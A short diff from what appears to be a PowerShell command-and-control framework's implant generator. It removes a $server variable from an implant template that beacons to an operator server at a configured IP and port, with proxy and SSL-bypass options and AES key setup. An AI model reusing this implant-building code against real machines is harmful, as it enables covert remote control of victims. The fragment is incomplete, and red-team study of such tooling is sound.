@@ -6,15 +6,12 @@ $newImplantURL = $newImplant[0] -replace '"',''
 
 if ($Daisy.IsPresent) { 
     $connect= "$($newImplantURL)?d"
-    $server = "`$Server = `"$($ipv4address):$($serverport)`""
     $proxynone = "if (!`$proxyurl){`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
 } elseif ($Proxy.IsPresent) { 
     $proxynone = ""
-    $server = ""
     $connect="$($newImplantURL)?p" 
 } else { 
     $proxynone = ""
-    $server = ""
     $connect="$($newImplantURL)" 
 }
 if ($Insecure.IsPresent) {
@@ -23,7 +20,6 @@ if ($Insecure.IsPresent) {
     $ssl = ''
 }
 $command = ''+$ssl+'
-'+$server+'
 $s="'+$ipv4address+":"+$serverport+'/'+$connect+'"
 function CAM ($key,$IV){
 $a = New-Object -TypeName "System.Security.Cryptography.RijndaelManaged"
